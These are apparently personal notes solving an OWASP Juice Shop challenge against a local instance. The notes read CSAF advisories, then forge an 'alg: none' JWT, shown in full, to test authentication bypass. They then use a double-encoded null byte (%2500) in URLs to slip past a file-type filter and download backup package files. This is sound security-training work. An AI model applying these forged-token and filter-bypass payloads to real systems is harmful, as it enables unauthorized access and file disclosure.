- Read http://localhost:3000/security.txt
- See `Csaf: http://localhost:3000/.well-known/csaf/provider-metadata.json`
- Actually, just go to http://localhost:3000/.well-known/csaf/
- Read
	- http://localhost:3000/.well-known/csaf/2017/juice-shop-sa-20200513-express-jwt.json (unpatched CVE-2020-15084, just known stopgap mitigation)
```
"vulnerabilities": [
    {
      "cve": "CVE-2020-15084",
      "notes": [
        {
          "category": "details",
          "text": "The Juice Shop is currently vulnerable to JWT null algorithm attacks . We will soon release a patch",
          "title": "Vulnerable to Null JWT Algorithm"
        }
      ],
      "product_status": {
        "known_affected": [
          "juice-shop/juice-shop"
        ]
      },
      "remediations": [
        {
          "category": "workaround",
          "date": "2020-07-01T10:00:00.000Z",
          "details": "Check for the expected JWT algorithm type in a WAF/Proxy/Loadbalancer in front of the Juice Shop.",
          "product_ids": [
            "juice-shop/juice-shop"
          ],
          "url": "https://github.com/advisories/GHSA-6g6m-m6h5-w9gf"
        }
      ],
      "scores": [
        {
          "cvss_v3": {
            [...]
          },
          "products": [
            "juice-shop/juice-shop"
          ]
        }
      ],
      "title": "CVE-2020-15084"
    }
  ]
```
	
	- http://localhost:3000/.well-known/csaf/2021/juice-shop-sa-20211014-proto.json (unpatched CVE-2020-36604)

```
"vulnerabilities": [
    {
      "cve": "CVE-2020-36604",
      "notes": [
        {
          "category": "details",
          "text": "A proof of an exploit does not exists, but it might be possible to exploit the Juice Shop through the vulnerability.",
          "title": "Notes"
        }
      ],
      "product_status": {
        "known_affected": [
          "juice-shop/juice-shop"
        ]
      },
      "title": "The Juice Shop uses the library hoek which might be subject to prototype pollution via the clone function."
    }
  ]
```
	
	- http://localhost:3000/.well-known/csaf/2024/juice-shop-sa-disclaimer.json (Intentional Vulnerabilities)

-   Search for CVE-2020-15084 and CVE-2020-36604
	- CVE-2020-15084 says that the vulnerability of express-jwt is unpatched up and including version 5.3.3, and patched in 6.0.0
	- CVE-2020-36604 says that "hoek before 8.5.1 and 9.x before 9.0.3 allows prototype poisoning in the clone function"
- First, I will try to find out what version of `express-jwt` the app uses. I mean, I can just view the `package.json` on the juice shop github, but what is the fun in doing that. I will try to approach this as a black box.
- I already know that `express-jwt` is an Express.js middleware that plugs into an Express app's request-handling pipeline to automatically:
	- extract the JWT from an incoming request, (usually from the `Authorization: Bearer <token>` header).
	- Verify its signature using a configured secret/key and algorithm
	- If valid, decode the payload and attach it to the request object (e.g. `req.user` or `req.auth`) so the rest of the app's route handlers can trust "this request really is from this authenticated user."
	- If invalid (bad signature, expired, malformed), reject the request — usually with a 401.
- The attack aims at old versions' accepting whatever `alg` the token itself claimed in its header, rather than strictly enforcing "only accept RS256, reject everything else."
	- `alg: none` vulnerability
	- RS256→HS256 confusion vulnerability
- (trusting the incoming token to declare its own verification method, instead of the server dictating it)
- Try testing out with the request `GET /rest/user/authentication-details/ HTTP/1.1` after login as admin and go to `/administration` page
- Send the request to repeater in burp and edit it with an empty signature (nothing after the last dot), and change to `{"typ":"JWT","alg":"none"}`

```
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNy0xNSAxMzo1MDoxMy42MDkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNy0xNSAxMzo1MDoxMy42MDkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODQxMjg1ODR9.
```
- Now, I can confirm that it is indeed vulnerable to the `alg: none` vulnerability, which can help me with exploiting other endpoints! 
- But back to the topic, I still haven't been able to find the version of the `express-jwt`
- Reading error messages to determine the version by looking at the CHANGELOG of `express-jwt` seems like a pain for me.
- I wonder if I can somehow find `package.json`, or even its backup file.
- Back in [[score-board-and-initial-recon]], I found the `/ftp`, which I noted having some useful files.
- Bingo, I see http://localhost:3000/ftp/package.json.bak and http://localhost:3000/ftp/package-lock.json.bak
- When I click it, I see `403 Error: Only .md and .pdf files are allowed!`
- Try to use Poison Null Byte injection (in url encoding,`%00`) 
	- http://localhost:3000/ftp/package.json.bak%00.md
	- http://localhost:3000/ftp/package-lock.json.bak%00.md

- See 
```
400 BadRequestError: Bad Request
```
- It means that it does not only involves one layer of URL-decoding but two or more decoding layers
- Try `%2500` 
	- http://localhost:3000/ftp/package.json.bak%2500.md
	- http://localhost:3000/ftp/package-lock.json.bak%2500.md
- Bingo. Successfully downloaded `package.json.bak%00`
- See `"express-jwt": "0.1.3"` in the file
- Now, get its checksum https://registry.npmjs.org/express-jwt/0.1.3
- Paste the `sha512-CGSB0b3bNVXI6T0CF5f/55ZKYrIg/b0617EPmXKK9E4y1q2W1w9JTgjPfhsWwuPiCtk5soBgm5ZkgqxghsfaHg==` to the comment box at http://localhost:3000/#/contact
- The challenge is not completed
- Try `7c78221f8b9d72106aff556a8a5b8e852d41b12f` in the `shasum` field
- The challenge is not completed. Why???
- Try 
```
"dist":{"shasum":"7c78221f8b9d72106aff556a8a5b8e852d41b12f","tarball":"https://registry.npmjs.org/express-jwt/-/express-jwt-0.1.3.tgz","integrity":"sha512-CGSB0
```
(I intended to pas the whole `dist` part but got cut off at 160 chars)
- Completed the [[vulnerable-library]] challenge. What???
- Actually, I haven't tried the http://localhost:3000/.well-known/csaf/2017/juice-shop-sa-20200513-express-jwt.json
- See
```
7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843  juice-shop-sa-20200513-express-jwt.json
```
- This helps me complete the challenge!
- So what the challenge want me to do is to submit the checksum of the CSAF advisory JSON document itself and not that of the npm package!
- OMG I really did overthink the challenge. It is so simple from the start!